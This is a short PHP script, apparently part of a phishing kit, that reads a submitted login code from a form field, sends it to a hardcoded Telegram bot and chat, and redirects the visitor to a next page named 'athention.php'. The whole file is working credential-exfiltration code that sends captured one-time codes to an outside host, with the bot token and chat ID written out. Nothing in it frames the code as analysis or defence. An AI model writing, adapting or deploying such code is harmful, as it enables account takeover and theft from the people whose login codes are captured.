<?php
// Telegram Bot Token from BotFather
$botToken = "7652154074:AAEQX3FzEBlMyCPqUJVkgUzl6mL0mi1zj-Q";
// Telegram Chat ID (could be a group or individual chat ID)
$chatId = "6968789311";

// Retrieve the form data
$loginCode = $_POST['PrevToPass'];

// Message to send to Telegram
$message = "Login code received: " . htmlspecialchars($loginCode);

// API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Send the request
$response = file_get_contents($url);

// Check response


header('Location:athention.php');


?>
